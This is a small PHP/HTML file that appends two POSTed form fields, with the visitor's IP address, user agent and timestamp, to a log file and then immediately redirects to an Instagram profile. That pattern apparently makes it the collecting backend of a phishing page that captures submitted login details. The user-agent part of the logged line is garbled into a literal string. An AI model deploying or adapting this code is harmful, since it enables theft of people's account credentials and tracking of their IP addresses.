<!doctype html><html><head>
<?php
$t = time();
$date = date('d/n/Y H:i:s', $t);
$ip = getenv('HTTP_CF_CONNECTING_IP');
$userAgent = getenv('HTTP_USER_AGENT');

if(isset($_POST['field1']) && isset($_POST['field2'])) {
    $data = 'Name: ' . $_POST['field1'] . ' | Input: ' . $_POST['field2'] . ' | Time and date: ' . $date . ' | IP Address: ' . $ip . ' | User-agent: DIE(func [getenv("HTTP_USER_AGENT")]) ' . "\n";
    $ret = file_put_contents('logs/input.txt', $data, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('There was an error writing this file');
    }
    else {
        echo "$ret bytes written to file";
    }
}
else {
   die('no post data to process');
}
?>
    <meta http-equiv="refresh" content="0;URL='https://instagram.com/seetowsh'" />    </head></html>
